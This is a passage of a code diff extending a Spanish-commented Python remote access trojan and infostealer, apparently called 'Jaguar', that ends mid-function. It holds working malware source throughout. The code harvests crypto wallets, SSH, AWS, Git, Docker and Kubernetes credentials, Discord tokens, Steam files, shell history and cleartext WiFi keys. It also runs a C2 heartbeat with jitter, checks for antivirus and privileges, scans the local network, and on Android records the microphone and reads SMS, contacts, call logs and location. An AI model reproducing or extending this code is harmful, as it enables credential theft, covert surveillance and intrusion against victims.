+            "Ethereum": os.path.join(_HOME, ".ethereum", "keystore"),
+            "Bitcoin": os.path.join(_HOME, ".bitcoin", "wallets"),
+            "Monero": os.path.join(_HOME, "Monero", "wallets"),
+            "Atomic": os.path.join(_HOME, ".config", "atomic", "Local Storage",
+                                   "leveldb"),
+            "Exodus": os.path.join(_HOME, ".config", "Exodus", "exodus.wallet"),
+        }
     for nombre, ruta in escritorio.items():
         if os.path.isdir(ruta):
             try:
@@ -2342,29 +3199,46 @@ def _col_wallets(base):
     return cont
 
 
-# -------------------------------- apps --------------------------------------
 def _col_apps(base):
     cont = {"archivos": 0}
     ra = os.environ.get("APPDATA", "")
-    up = os.path.expanduser("~")
+    up = _HOME
 
-    pares = [
-        ("FileZilla/recentservers.xml", os.path.join(ra, r"FileZilla\recentservers.xml")),
-        ("FileZilla/sitemanager.xml", os.path.join(ra, r"FileZilla\sitemanager.xml")),
-        ("WinSCP/WinSCP.ini", os.path.join(ra, "WinSCP.ini")),
-        ("OpenVPN", os.path.join(ra, r"OpenVPN Connect\profiles")),
-        ("WireGuard", os.path.join(up, "WireGuard")),
-        ("SSH", os.path.join(up, ".ssh")),
-        ("Git/gitconfig", os.path.join(up, ".gitconfig")),
-        ("Git/credentials", os.path.join(up, ".git-credentials")),
-        ("AWS/credentials", os.path.join(up, r".aws\credentials")),
-        ("Docker/config.json", os.path.join(up, r".docker\config.json")),
-        ("NordVPN", os.path.join(ra, "NordVPN")),
-        ("ProtonVPN", os.path.join(ra, "ProtonVPN")),
-        ("Slack", os.path.join(ra, "Slack")),
-        ("Teams", os.path.join(ra, r"Microsoft\Teams")),
-        ("Telegram/tdata", os.path.join(ra, r"Telegram Desktop\tdata")),
-    ]
+    if ES_WIN:
+        pares = [
+            ("FileZilla/recentservers.xml",
+             os.path.join(ra, r"FileZilla\recentservers.xml")),
+            ("FileZilla/sitemanager.xml",
+             os.path.join(ra, r"FileZilla\sitemanager.xml")),
+            ("WinSCP/WinSCP.ini", os.path.join(ra, "WinSCP.ini")),
+            ("OpenVPN", os.path.join(ra, r"OpenVPN Connect\profiles")),
+            ("WireGuard", os.path.join(up, "WireGuard")),
+            ("SSH", os.path.join(up, ".ssh")),
+            ("Git/gitconfig", os.path.join(up, ".gitconfig")),
+            ("Git/credentials", os.path.join(up, ".git-credentials")),
+            ("AWS/credentials", os.path.join(up, r".aws\credentials")),
+            ("Docker/config.json", os.path.join(up, r".docker\config.json")),
+            ("Slack", os.path.join(ra, "Slack")),
+            ("Telegram/tdata", os.path.join(ra, r"Telegram Desktop\tdata")),
+        ]
+    else:
+        pares = [
+            ("SSH", os.path.join(up, ".ssh")),
+            ("Git/gitconfig", os.path.join(up, ".gitconfig")),
+            ("Git/credentials", os.path.join(up, ".git-credentials")),
+            ("AWS/credentials", os.path.join(up, ".aws", "credentials")),
+            ("Docker/config.json", os.path.join(up, ".docker", "config.json")),
+            ("bash_history", os.path.join(up, ".bash_history")),
+            ("zsh_history", os.path.join(up, ".zsh_history")),
+            ("WireGuard", os.path.join(up, ".config", "wireguard")),
+            ("OpenVPN", os.path.join(up, ".config", "openvpn")),
+            ("FileZilla", os.path.join(up, ".config", "filezilla")),
+            ("Remmina", os.path.join(up, ".local", "share", "remmina")),
+            ("Slack", os.path.join(up, ".config", "Slack")),
+            ("npmrc", os.path.join(up, ".npmrc")),
+            ("netrc", os.path.join(up, ".netrc")),
+            ("kube/config", os.path.join(up, ".kube", "config")),
+        ]
     for nombre, ruta in pares:
         if os.path.isdir(ruta):
             try:
@@ -2374,45 +3248,21 @@ def _col_apps(base):
             except Exception:
                 pass
         elif os.path.isfile(ruta):
-            _escribir(os.path.join(base, "Apps", nombre),
-                      open(ruta, "rb").read())
-            cont["archivos"] += 1
+            try:
+                with open(ruta, "rb") as f:
+                    _escribir(os.path.join(base, "Apps", nombre), f.read())
+                cont["archivos"] += 1
+            except Exception:
+                pass
 
-    # PuTTY (registro)
     try:
-        import winreg
-        lineas = []
-        try:
-            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                               r"Software\SimonTatham\PuTTY\Sessions")
-            n = winreg.QueryInfoKey(k)[0]
-            for i in range(n):
-                sub = winreg.EnumKey(k, i)
-                lineas.append(f"[{sub}]")
-                try:
-                    sk = winreg.OpenKey(k, sub)
-                    for j in range(winreg.QueryInfoKey(sk)[1]):
-                        nom, val, _ = winreg.EnumValue(sk, j)
-                        if nom in ("HostName", "UserName", "PortNumber"):
-                            lineas.append(f"  {nom} = {val}")
-                except Exception:
-                    pass
-            winreg.CloseKey(k)
-        except Exception:
-            pass
-        if lineas:
-            _escribir(os.path.join(base, "Apps", "PuTTY_sesiones.txt"),
-                      "\n".join(lineas))
-            cont["archivos"] += 1
-    except Exception:
-        pass
-
-    # Discord token (leveldb)
-    try:
-        import re
-        for nombre, ruta in (("Discord", os.path.join(ra, r"discord\Local Storage\leveldb")),
-                             ("DiscordPTB", os.path.join(ra, r"discordptb\Local Storage\leveldb")),
-                             ("DiscordCanary", os.path.join(ra, r"discordcanary\Local Storage\leveldb"))):
+        for nombre, ruta in (
+                ("Discord", os.path.join(ra, r"discord\Local Storage\leveldb")
+                 if ES_WIN else os.path.join(up, ".config", "discord",
+                                             "Local Storage", "leveldb")),
+                ("DiscordPTB", os.path.join(ra, r"discordptb\Local Storage\leveldb")
+                 if ES_WIN else os.path.join(up, ".config", "discordptb",
+                                             "Local Storage", "leveldb"))):
             if not os.path.isdir(ruta):
                 continue
             tokens = set()
@@ -2420,7 +3270,8 @@ def _col_apps(base):
                 if not a.endswith((".ldb", ".log")):
                     continue
                 try:
-                    crudo = open(os.path.join(ruta, a), "rb").read()
+                    with open(os.path.join(ruta, a), "rb") as f:
+                        crudo = f.read()
                     for m in re.findall(rb"[\w-]{24,}\.[\w-]{6}\.[\w-]{25,110}", crudo):
                         tokens.add(m.decode("latin-1", "ignore"))
                 except Exception:
@@ -2432,59 +3283,110 @@ def _col_apps(base):
     except Exception:
         pass
 
-    # Steam
-    try:
-        for prog in (os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
-                     os.environ.get("ProgramFiles", r"C:\Program Files")):
-            cfg = os.path.join(prog, "Steam", "config")
+    if ES_WIN:
+        try:
+            for prog in (os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
+                         os.environ.get("ProgramFiles", r"C:\Program Files")):
+                cfg = os.path.join(prog, "Steam", "config")
+                if os.path.isdir(cfg):
+                    for a in ("loginusers.vdf", "config.vdf"):
+                        p = os.path.join(cfg, a)
+                        if os.path.isfile(p):
+                            with open(p, "rb") as f:
+                                _escribir(os.path.join(base, "Apps", "Steam", a),
+                                          f.read())
+                            cont["archivos"] += 1
+                    break
+        except Exception:
+            pass
+    else:
+        for cfg in (os.path.join(_HOME, ".steam", "steam", "config"),
+                    os.path.join(_HOME, ".local", "share", "Steam", "config")):
             if os.path.isdir(cfg):
                 for a in ("loginusers.vdf", "config.vdf"):
                     p = os.path.join(cfg, a)
                     if os.path.isfile(p):
-                        _escribir(os.path.join(base, "Apps", "Steam", a),
-                                  open(p, "rb").read())
+                        with open(p, "rb") as f:
+                            _escribir(os.path.join(base, "Apps", "Steam", a), f.read())
                         cont["archivos"] += 1
-                for a in os.listdir(prog + r"\Steam"):
-                    if a.startswith("ssfn"):
-                        try:
-                            shutil.copy2(os.path.join(prog, "Steam", a),
-                                         os.path.join(base, "Apps", "Steam", a))
-                            cont["archivos"] += 1
-                        except Exception:
-                            pass
                 break
-    except Exception:
-        pass
     return cont
 
 
-# ------------------------------ sistema -------------------------------------
 def _col_wifi(base):
     cont = {"redes": 0}
     try:
-        r = subprocess.run(["netsh", "wlan", "show", "profiles"],
-                           capture_output=True, text=True, **_sin_consola())
-        nombres = []
-        for ln in (r.stdout or "").splitlines():
-            if ":" in ln and ("perfil" in ln.lower() or "profile" in ln.lower()):
-                nombres.append(ln.split(":", 1)[1].strip())
-        lineas = []
-        for nom in nombres:
-            try:
+        if ES_ANDROID:
+            d = _tx_json("termux-wifi-connectioninfo")
+            lineas = []
+            if d:
+                lineas.append(f"{d.get('ssid', '?')}\t"
+                              f"{d.get('bssid', '')}\t{d.get('ip', '')}")
+                cont["redes"] += 1
+            ok, txt = _tx("termux-wifi-scaninfo", timeout=25)
+            if txt:
+                try:
+                    for ap in json.loads(txt):
+                        lineas.append(f"{ap.get('ssid', '?')}\t"
+                                      f"{ap.get('bssid', '')}\t{ap.get('frequency', '')}")
+                        cont["redes"] += 1
+                except Exception:
+                    lineas.append(txt[:500])
+            if lineas:
+                _escribir(os.path.join(base, "Sistema", "wifi.txt"), "\n".join(lineas))
+        elif ES_WIN:
+            r = subprocess.run(["netsh", "wlan", "show", "profiles"],
+                               capture_output=True, text=True, **_sin_consola())
+            nombres = []
+            for ln in (r.stdout or "").splitlines():
+                if ":" in ln and ("perfil" in ln.lower() or "profile" in ln.lower()):
+                    nombres.append(ln.split(":", 1)[1].strip())
+            lineas = []
+            for nom in nombres:
                 r2 = subprocess.run(["netsh", "wlan", "show", "profile",
                                      f"name={nom}", "key=clear"],
                                     capture_output=True, text=True, **_sin_consola())
                 clave = ""
                 for ln in (r2.stdout or "").splitlines():
-                    if ":" in ln and ("clave" in ln.lower() or "key content" in ln.lower()):
+                    if ":" in ln and ("clave" in ln.lower()
+                                      or "key content" in ln.lower()):
                         clave = ln.split(":", 1)[1].strip()
                         break
                 lineas.append(f"{nom}\t{clave}")
                 cont["redes"] += 1
-            except Exception:
-                pass
-        if lineas:
-            _escribir(os.path.join(base, "Sistema", "wifi.txt"), "\n".join(lineas))
+            if lineas:
+                _escribir(os.path.join(base, "Sistema", "wifi.txt"), "\n".join(lineas))
+        else:
+            dirs = ["/etc/NetworkManager/system-connections",
+                    os.path.join(_HOME, ".config", "NetworkManager",
+                                 "system-connections")]
+            lineas = []
+            for d in dirs:
+                if not os.path.isdir(d):
+                    continue
+                for archivo in os.listdir(d):
+                    p = os.path.join(d, archivo)
+                    try:
+                        with open(p, encoding="utf-8", errors="replace") as f:
+                            txt = f.read()
+                        ssid = psk = ""
+                        for ln in txt.splitlines():
+                            if ln.startswith("ssid="):
+                                ssid = ln.split("=", 1)[1].strip()
+                            elif ln.startswith("psk="):
+                                psk = ln.split("=", 1)[1].strip()
+                        if ssid:
+                            lineas.append(f"{ssid}\t{psk}")
+                            cont["redes"] += 1
+                    except Exception:
+                        continue
+            if not lineas and _tiene("nmcli"):
+                r = subprocess.run(["nmcli", "-f", "NAME,PASSWORD", "dev", "wifi",
+                                    "list"], capture_output=True, text=True, timeout=15)
+                if r.stdout.strip():
+                    lineas = r.stdout.strip().splitlines()
+            if lineas:
+                _escribir(os.path.join(base, "Sistema", "wifi.txt"), "\n".join(lineas))
     except Exception:
         pass
     return cont
@@ -2494,7 +3396,9 @@ def _col_sistema(base):
     cont = {"items": 0}
     try:
         info = _sysinfo()
-        info["usuario_dominio"] = f"{os.environ.get('USERDOMAIN', '')}\\{_usuario()}"
+        info["usuario_dominio"] = (f"{os.environ.get('USERDOMAIN', '')}\\{_usuario()}"
+                                   if ES_WIN else _usuario())
+        info["es_vm"] = _es_vm()
         _escribir(os.path.join(base, "Sistema", "info.txt"),
                   json.dumps(info, indent=2, ensure_ascii=False))
         cont["items"] += 1
@@ -2507,40 +3411,41 @@ def _col_sistema(base):
     except Exception:
         pass
     try:
-        r = subprocess.run(["tasklist"], capture_output=True, text=True, **_sin_consola())
+        cmd = ["tasklist"] if ES_WIN else (["ps", "-A"] if ES_ANDROID else ["ps", "aux"])
+        r = subprocess.run(cmd, capture_output=True, text=True, **_sin_consola())
         _escribir(os.path.join(base, "Sistema", "procesos.txt"), r.stdout or "")
         cont["items"] += 1
     except Exception:
         pass
-    try:
-        lineas = []
-        for ruta, vista in ((r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0),
-                            (r"SOFTWARE\WOW6432Node\Microsoft\Windows"
-                             r"\CurrentVersion\Uninstall", 0)):
+    if ES_ANDROID:
+        for nombre, cmd in (("bateria.txt", "termux-battery-status"),
+                            ("telefonia.txt", "termux-telephony-deviceinfo"),
+                            ("apps.txt", "pm list packages -3"),
+                            ("almacenamiento.txt", "df -h")):
             try:
-                import winreg
-                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ruta)
-                for i in range(winreg.QueryInfoKey(k)[0]):
-                    try:
-                        sub = winreg.EnumKey(k, i)
-                        sk = winreg.OpenKey(k, sub)
-                        nom = winreg.QueryValueEx(sk, "DisplayName")[0]
-                        ver = ""
-                        try:
-                            ver = winreg.QueryValueEx(sk, "DisplayVersion")[0]
-                        except Exception:
-                            pass
-                        lineas.append(f"{nom} {ver}")
-                    except Exception:
-                        pass
+                r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
+                                   timeout=25)
+                if r.stdout.strip():
+                    _escribir(os.path.join(base, "Sistema", nombre), r.stdout)
+                    cont["items"] += 1
             except Exception:
-                pass
-        if lineas:
-            _escribir(os.path.join(base, "Sistema", "programas.txt"),
-                      "\n".join(sorted(set(lineas))))
-            cont["items"] += 1
-    except Exception:
-        pass
+                continue
+    elif not ES_WIN:
+        for nombre, cmd in (("usuarios.txt", "cat /etc/passwd"),
+                            ("sudoers.txt", "cat /etc/sudoers 2>/dev/null"),
+                            ("servicios.txt", "systemctl list-units --type=service "
+                                              "--state=running --no-pager"),
+                            ("crontab.txt", "crontab -l 2>/dev/null"),
+                            ("paquetes.txt", "dpkg -l 2>/dev/null || rpm -qa"),
+                            ("red.txt", "ip -br addr; ip route")):
+            try:
+                r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
+                                   timeout=25)
+                if r.stdout.strip():
+                    _escribir(os.path.join(base, "Sistema", nombre), r.stdout)
+                    cont["items"] += 1
+            except Exception:
+                continue
     try:
         t = _clip_get({}).get("texto", "")
         if t:
@@ -2574,7 +3479,6 @@ def _col_keylog(base):
     return {}
 
 
-# --------------------------- orquestacion -----------------------------------
 def _stealer_recolectar(a):
     if _STEAL["activo"]:
         return {"estado": "ya en curso", "fase": _STEAL["fase"]}
@@ -2755,31 +3659,569 @@ def _stealer_auto_loop():
             time.sleep(2)
 
 
-# ============================================================================
+# ===========================================================================
+#  Recon / beacon
+# ===========================================================================
+def _hilo_latido(sock):
+    while True:
+        try:
+            _enviar(sock, {"tipo": "latido", "ts": time.time(),
+                           "sleep": SLEEP, "jitter": JITTER})
+        except Exception:
+            return
+        time.sleep(max(1.0, SLEEP * (1 + random.uniform(-JITTER, JITTER))))
 
+
+def _whoami(a):
+    return {"salida": _cmd_out("whoami /all" if ES_WIN else "id; echo; groups")}
+
+
+def _netstat(a):
+    if ES_WIN:
+        return {"salida": _cmd_out("netstat -ano")}
+    return {"salida": _cmd_out("ss -tulpn 2>/dev/null || netstat -tulpn")}
+
+
+def _arp(a):
+    if ES_WIN:
+        return {"salida": _cmd_out("arp -a")}
+    return {"salida": _cmd_out("ip neigh 2>/dev/null; cat /proc/net/arp")}
+
+
+def _ipconfig(a):
+    if ES_WIN:
+        return {"salida": _cmd_out("ipconfig /all")}
+    if ES_ANDROID:
+        return {"salida": _cmd_out("ip -br addr; ip route; getprop | grep -i net")}
+    return {"salida": _cmd_out("ip -br addr; ip route")}
+
+
+def _tasklist(a):
+    return {"salida": _cmd_out("tasklist /v" if ES_WIN else "ps auxf")}
+
+
+def _net_user(a):
+    if ES_WIN:
+        return {"salida": _cmd_out("net user")}
+    return {"salida": _cmd_out("cut -d: -f1,3 /etc/passwd; echo; who")}
+
+
+def _net_view(a):
+    if ES_WIN:
+        return {"salida": _cmd_out("net view")}
+    return {"salida": _cmd_out("smbclient -L localhost -N 2>/dev/null || "
+                               "showmount -e localhost 2>/dev/null")}
+
+
+def _schtasks_list(a):
+    if ES_WIN:
+        return {"salida": _cmd_out("schtasks /query /fo LIST")}
+    return {"salida": _cmd_out("crontab -l 2>/dev/null; echo ---; "
+                               "systemctl list-timers --no-pager 2>/dev/null")}
+
+
+def _drives(a):
+    return {"salida": _cmd_out("wmic logicaldisk get name,size,freespace,volumename"
+                               if ES_WIN else "df -h")}
+
+
+def _env(a):
+    return {"salida": "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))}
+
+
+def _wmi(a):
+    if ES_WIN:
+        return {"salida": _ps("Get-CimInstance Win32_ComputerSystem | Format-List *")}
+    if ES_ANDROID:
+        return {"salida": _cmd_out("getprop | head -80; echo; cat /proc/cpuinfo | "
+                                   "head -30")}
+    return {"salida": _cmd_out("lscpu; echo; free -h; echo; lsblk; echo; "
+                               "cat /sys/class/dmi/id/product_name 2>/dev/null")}
+
+
+def _powershell(a):
+    return {"salida": _ps(a.get("comando", ""))}
+
+
+def _privilegios(a):
+    if ES_WIN:
+        return {"salida": _cmd_out("whoami /priv")}
+    if ES_ANDROID:
+        return {"salida": _root_cmd("id") if _es_root_android() else "sin root"}
+    return {"salida": _cmd_out("id; echo ---; sudo -n -l 2>/dev/null; echo ---; "
+                               "ls -l /etc/sudoers.d 2>/dev/null")}
+
+
+def _av(a):
+    if ES_ANDROID:
+        return {"salida": _cmd_out("getprop | grep -iE 'av|antivirus'")}
+    if not ES_WIN:
+        lineas = []
+        for cmd, etq in ((_cmd_out("systemctl is-active ufw"), "ufw"),
+                         (_cmd_out("systemctl is-active firewalld"), "firewalld"),
+                         (_cmd_out("pgrep -a clamd"), "clamav"),
+                         (_cmd_out("which apparmor_status && apparmor_status | head -5"),
+                          "apparmor"),
+                         (_cmd_out("which getenforce && getenforce"), "selinux")):
+            if cmd and "[error]" not in cmd:
+                lineas.append(f"{etq}: {cmd.strip()[:200]}")
+        return {"salida": "\n".join(lineas) or "(sin AV/EDR detectado)"}
+    salida = _ps("Get-MpComputerStatus | Select AMServiceEnabled,AntivirusEnabled,"
+                 "RealTimeProtectionEnabled | Format-List")
+    if not salida or "Get-MpComputerStatus" in salida:
+        salida = _cmd_out('wmic /namespace:\\\\root\\SecurityCenter2 path '
+                          'AntiVirusProduct get displayName,productState /format:list')
+    return {"salida": salida or "(sin AV reportado)"}
+
+
+def _uac(a):
+    if ES_WIN:
+        return {"salida": _cmd_out(r"reg query HKLM\SOFTWARE\Microsoft\Windows"
+                                   r"\CurrentVersion\Policies\System")}
+    return {"salida": _cmd_out("cat /etc/sudoers 2>/dev/null | grep -v '^#'; "
+                               "echo ---; getent group sudo wheel adm")}
+
+
+def _wifi_perfiles(a):
+    if ES_ANDROID:
+        d = _tx_json("termux-wifi-connectioninfo")
+        lineas = []
+        if d:
+            lineas.append(f"{d.get('ssid', '?')}  ->  (conectado)")
+        ok, txt = _tx("termux-wifi-scaninfo", timeout=25)
+        if txt:
+            try:
+                for ap in json.loads(txt):
+                    lineas.append(f"{ap.get('ssid', '?')}  ->  {ap.get('bssid', '')}")
+            except Exception:
+                lineas.append(txt[:500])
+        return {"salida": "\n".join(lineas) or "(sin datos)"}
+    if ES_WIN:
+        nombres = []
+        for ln in _cmd_out("netsh wlan show profiles").splitlines():
+            low = ln.lower()
+            if ":" in ln and ("perfil" in low or "profile" in low):
+                nombres.append(ln.split(":", 1)[1].strip())
+        lineas = []
+        for n in nombres:
+            det = _cmd_out(f'netsh wlan show profile name="{n}" key=clear')
+            clave = ""
+            for ln in det.splitlines():
+                low = ln.lower()
+                if ":" in ln and ("clave" in low or "key content" in low):
+                    clave = ln.split(":", 1)[1].strip()
+                    break
+            lineas.append(f"{n}  ->  {clave or '(sin clave)'}")
+        return {"salida": "\n".join(lineas) or "(sin perfiles)"}
+    lineas = []
+    for d in ("/etc/NetworkManager/system-connections",
+              os.path.join(_HOME, ".config", "NetworkManager",
+                           "system-connections")):
+        if not os.path.isdir(d):
+            continue
+        for archivo in os.listdir(d):
+            try:
+                with open(os.path.join(d, archivo), encoding="utf-8",
+                          errors="replace") as f:
+                    txt = f.read()
+                ssid = psk = ""
+                for ln in txt.splitlines():
+                    if ln.startswith("ssid="):
+                        ssid = ln.split("=", 1)[1].strip()
+                    elif ln.startswith("psk="):
+                        psk = ln.split("=", 1)[1].strip()
+                if ssid:
+                    lineas.append(f"{ssid}  ->  {psk or '(sin clave)'}")
+            except Exception:
+                continue
+    if not lineas and _tiene("nmcli"):
+        lineas = [_cmd_out("nmcli -f NAME,PASSWORD dev wifi list")]
+    return {"salida": "\n".join(lineas) or "(sin perfiles / usa root)"}
+
+
+def _portscan(a):
+    import ipaddress
+    from concurrent.futures import ThreadPoolExecutor
+    base = a.get("objetivo") or _ip_interna()
+    try:
+        red = ipaddress.ip_network(str(base) + "/24", strict=False)
+        hosts = [str(h) for h in red.hosts()]
+    except Exception:
+        hosts = [str(base)]
+    puertos = a.get("puertos") or [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443,
+                                   445, 1433, 1521, 3306, 3389, 5432, 5900, 6379,
+                                   8080, 8443, 9200, 27017]
+    abiertos = []
+
+    def _p(par):
+        ip, pt = par
+        s = socket.socket()
+        s.settimeout(0.5)
+        try:
+            if s.connect_ex((ip, pt)) == 0:
+                return f"{ip}:{pt}"
+        except Exception:
+            return None
+        finally:
+            s.close()
+        return None
+
+    with ThreadPoolExecutor(max_workers=128) as ex:
+        for r in ex.map(_p, [(ip, pt) for ip in hosts for pt in puertos]):
+            if r:
+                abiertos.append(r)
+    return {"objetivo": base, "abiertos": sorted(abiertos)}
+
+
+def _recon_full(a):
+    return {
+        "equipo": _sysinfo(),
+        "usuario": _cmd_out("whoami /all" if ES_WIN else "id; echo; groups"),
+        "av": _av({})["salida"],
+        "uac": _uac({})["salida"],
+        "red": _ipconfig({})["salida"],
+        "puertos": _netstat({})["salida"],
+        "arp": _arp({})["salida"],
+        "rutas": _cmd_out("route print" if ES_WIN else "ip route"),
+        "admins": _cmd_out("net localgroup administrators" if ES_WIN
+                           else "getent group sudo adm wheel"),
+        "sesiones": _cmd_out("query user" if ES_WIN else "who; w"),
+        "servicios": (_ps("Get-Service | Where-Object {$_.Status -eq 'Running'} | "
+                          "Select Name,DisplayName | Format-Table -Auto") if ES_WIN
+                      else _cmd_out("systemctl list-units --type=service "
+                                    "--state=running --no-pager 2>/dev/null")),
+        "tareas": _schtasks_list({})["salida"],
+        "hotfixes": (_ps("Get-HotFix | Select HotFixID,InstalledOn | Format-Table -Auto")
+                     if ES_WIN else _cmd_out("uname -a; cat /etc/os-release")),
+        "wifi": _wifi_perfiles({})["salida"],
+        "discos": _drives({})["salida"],
+    }
+
+
+# ===========================================================================
+#  MODULO MOVIL (Android / Termux)
+# ===========================================================================
+def _movil_info(a):
+    d = _android_info()
+    d["ip"] = _ip_interna()
+    b = _tx_json("termux-battery-status")
+    if b:
+        d["bateria"] = b
+    try:
+        r = subprocess.run(["df", "-h", _HOME], capture_output=True, text=True,
+                           timeout=10)
+        lineas = (r.stdout or "").strip().splitlines()
+        if len(lineas) > 1:
+            d["almacenamiento"] = " ".join(lineas[1].split()[1:4])
+    except Exception:
+        pass
+    d["caps_movil"] = True
+    return d
+
+
+def _movil_pantalla(a):
+    return _captura_android("jpeg", int(a.get("calidad", 70)),
+                            float(a.get("escala", 1.0)) or 1.0)
+
+
+def _movil_tap(a):
+    x, y = int(a.get("x", 0)), int(a.get("y", 0))
+    _root_cmd(f"input tap {x} {y}", timeout=12)
+    return {"estado": f"tap {x},{y}"}
+
+
+def _movil_swipe(a):
+    _root_cmd(f"input swipe {int(a.get('x1', 0))} {int(a.get('y1', 0))} "
+              f"{int(a.get('x2', 0))} {int(a.get('y2', 0))} {int(a.get('ms', 300))}",
+              timeout=15)
+    return {"estado": "swipe"}
+
+
+def _movil_texto(a):
+    txt = str(a.get("texto", "")).replace(" ", "%s")
+    _root_cmd(f"input text '{txt}'", timeout=15)
+    return {"estado": "texto"}
+
+
+def _movil_tecla(a):
+    _root_cmd(f"input keyevent {int(a.get('code', 4))}", timeout=12)
+    return {"estado": "tecla"}
+
+
+def _movil_camara(a):
+    return _webcam({"cam": int(a.get("cam", 0))})
+
+
+def _movil_mic(a):
+    seg = max(2, min(120, int(a.get("segundos", 10))))
+    destino = os.path.join(_HOME, ".jaguar_mic.m4a")
+    _tx("termux-microphone-record", "-f", destino, "-l", str(seg), timeout=seg + 15)
+    time.sleep(seg + 1)
+    _tx("termux-microphone-record", "-q", timeout=10)
+    try:
+        with open(destino, "rb") as f:
+            raw = f.read()
+        os.remove(destino)
+    except Exception as e:
+        return {"error": str(e), "b64": ""}
+    return {"b64": base64.b64encode(raw).decode(), "segundos": seg,
+            "tamano": len(raw)}
+
+
+def _movil_sms(a):
+    d = _tx_json("termux-sms-list", "-l", str(int(a.get("limite", 50))))
+    if d is None:
+        return {"error": "termux-api no instalado (pkg install termux-api)",
+                "lista": []}
+    lista = []
+    for s in d:
+        lista.append({"numero": s.get("number", ""),
+                      "fecha": time.strftime("%Y-%m-%d %H:%M",
+                                             time.localtime(s.get("received", 0))),
+                      "tipo": s.get("type", ""),
+                      "texto": s.get("body", "")})
+    return {"lista": lista}
+
+
+def _movil_sms_enviar(a):
+    ok, txt = _tx("termux-sms-send", "-n", str(a.get("numero", "")),
+                  str(a.get("texto", "")), timeout=30)
+    return {"ok": ok, "salida": txt}
+
+
+def _movil_contactos(a):
+    d = _tx_json("termux-contact-list")
+    if d is None:
+        return {"error": "termux-api no instalado", "lista": []}
+    lista = []
+    for c in d:
+        lista.append({"nombre": c.get("name", ""),
+                      "numeros": [c.get("number", "")] if c.get("number") else []})
+    return {"lista": lista}
+
+
+def _movil_llamadas(a):
+    d = _tx_json("termux-call-log", "-l", str(int(a.get("limite", 50))))
+    if d is None:
+        return {"error": "termux-api no instalado", "lista": []}
+    tipos = {"1": "IN", "2": "OUT", "3": "PERDIDA", "4": "VOZ", "5": "RECHAZADA",
+             "6": "BLOQUEADA"}
+    lista = []
+    for c in d:
+        lista.append({"numero": c.get("phone_number", ""),
+                      "fecha": time.strftime("%Y-%m-%d %H:%M",
+                                             time.localtime(c.get("date", 0))),
+                      "duracion": c.get("duration", ""),
+                      "tipo": tipos.get(str(c.get("type", "")), c.get("type", ""))})
+    return {"lista": lista}
+
+
+def _movil_ubicacion(a):
+    d = _tx_json("termux-location")
+    return d or {"error": "termux-api no instalado"}
+
+
+def _movil_sensores(a):
+    if a.get("listar"):
+        ok, txt = _tx("termux-sensor", "-l", timeout=20)
+        return {"salida": txt}
+    nombre = a.get("nombre") or "accelerometer"
+    ok, txt = _tx("termux-sensor", "-s", nombre, "-n", "1", timeout=20)
+    return {"salida": txt, "sensor": nombre}
+
+
+def _movil_bateria(a):
+    d = _tx_json("termux-battery-status")
+    return d or {"error": "termux-api no instalado"}
+
+
+def _movil_almacenamiento(a):
+    return {"salida": _cmd_out("df -h | head -20")}
+
+
+def _movil_wifi(a):
+    d = _tx_json("termux-wifi-connectioninfo")
+    return d or {"error": "termux-api no instalado"}
+
+
+def _movil_wifi_scan(a):
+    d = _tx_json("termux-wifi-scaninfo")
+    return {"lista": d or [], "error": None if d else "termux-api no instalado"}
+
+
+def _movil_telefonia(a):
+    d = _tx_json("termux-telephony-deviceinfo")
+    return d or {"error": "termux-api no instalado"}
+
+
+def _movil_procesos(a):
+    return {"salida": _cmd_out("ps -A -o PID,USER,NAME 2>/dev/null || ps aux")}
+
+
+def _movil_cuentas(a):
+    return {"salida": _cmd_out("dumpsys account 2>/dev/null | head -40 || "
+                               "cmd account list 2>/dev/null")}
+
+
+def _movil_notif_list(a):
+    ok, txt = _tx("termux-notification-list", timeout=20)
+    try:
+        return {"lista": json.loads(txt)}
+    except Exception:
+        return {"salida": txt[:3000]}
+
+
+def _movil_clip_get(a):
+    return _clip_get(a)
+
+
+def _movil_clip_set(a):
+    return _clip_set(a)
+
+
+def _movil_notificar(a):
+    ok, txt = _tx("termux-notification", "--title", str(a.get("titulo", "Jaguar")),
+                  "--content", str(a.get("texto", "")), timeout=15)
+    return {"ok": ok, "salida": txt}
+
+
+def _movil_toast(a):
+    ok, txt = _tx("termux-toast", str(a.get("texto", "")), timeout=15)
+    return {"ok": ok, "salida": txt}
+
+
+def _movil_tts(a):
+    ok, txt = _tx("termux-tts-speak", str(a.get("texto", "")), timeout=20)
+    return {"ok": ok, "salida": txt}
+
+
+def _movil_vibrar(a):
+    ok, txt = _tx("termux-vibrate", "-d", str(int(a.get("ms", 1000))), timeout=15)
+    return {"ok": ok, "salida": txt}
+
+
+def _movil_linterna(a):
+    ok, txt = _tx("termux-torch", "on", timeout=15)
+    time.sleep(1)
+    _tx("termux-torch", "off", timeout=15)
+    return {"ok": ok, "salida": txt or "torch on/off"}
+
+
+def _movil_fondo(a):
+    ruta = a.get("ruta")
+    if ruta and os.path.isfile(ruta):
+        ok, txt = _tx("termux-wallpaper", "-f", ruta, timeout=20)
+        return {"ok": ok, "salida": txt}
+    return {"error": "falta ruta de imagen"}
+
+
+def _movil_huella(a):
+    ok, txt = _tx("termux-fingerprint", timeout=40)
+    return {"ok": ok, "salida": txt}
+
+
+def _movil_dialogo(a):
+    ok, txt = _tx("termux-dialog", "text", "-t", str(a.get("titulo", "Jaguar")),
+                  timeout=60)
+    return {"ok": ok, "salida": txt}
+
+
+def _movil_media(a):
+    ok, txt = _tx("termux-media-player", "play", timeout=15)
+    time.sleep(1)
+    _tx("termux-media-player", "pause", timeout=15)
+    return {"ok": ok, "salida": txt}
+
+
+def _movil_volumen(a):
+    ok, txt = _tx("termux-volume", "music", "15", timeout=15)
+    return {"ok": ok, "salida": txt}
+
+
+def _movil_apps(a):
+    flag = "-3" if a.get("tipo", "usuario") == "usuario" else ""
+    salida = _root_cmd(f"pm list packages {flag}".strip(), timeout=40)
+    lista = [l.replace("package:", "").strip() for l in salida.splitlines()
+             if l.startswith("package:")]
+    return {"lista": sorted(lista)}
+
+
+def _movil_app_abrir(a):
